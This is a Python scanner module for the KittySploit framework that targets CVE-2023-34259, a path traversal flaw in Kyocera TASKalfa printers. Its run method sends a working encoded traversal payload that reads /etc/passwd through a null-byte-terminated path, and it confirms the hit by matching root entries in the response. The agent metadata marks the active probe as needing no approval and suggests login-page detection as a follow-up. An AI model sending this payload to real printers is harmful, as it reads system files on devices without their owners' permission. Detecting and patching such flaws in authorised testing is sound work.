#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CCRX has a Path Traversal vulnerability."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Kyocera TASKalfa printer - Path Traversal Detection',
        'description': 'CCRX has a Path Traversal vulnerability. Path Traversal is an attack on web applications. By manipulating the value of the file path, an attacker can gain access to the file system, including source code and critical system settings.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'packetstorm', 'seclists', 'kyocera', 'lfi', 'printer', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://sec-consult.com/vulnerability-lab/advisory/path-traversal-bypass-denial-of-service-in-kyocera-printer/',
            'https://www.kyoceradocumentsolutions.com/en/our-business/security/information/2023-07-14.html',
            'https://packetstormsecurity.com/files/173397/Kyocera-TASKalfa-4053ci-2VG_S000.002.561-Path-Traversal-Denial-Of-Service.html',
            'https://sec-consult.com/vulnerability-lab/',
            'https://seclists.org/fulldisclosure/2023/Jul/15',
        ],
        'cve': 'CVE-2023-34259',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wlmdeu%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%00index.htm', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        server = r.headers.get("Server") or r.headers.get("server") or ""
        server_any = ('KM-MFP',)
        body_regexes = ('root:.*:0:0',)
        if (any(m in server for m in server_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Kyocera TASKalfa printer - Path Traversal detected",
                path='/wlmdeu%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%00index.htm',
            )
            return True
        return False

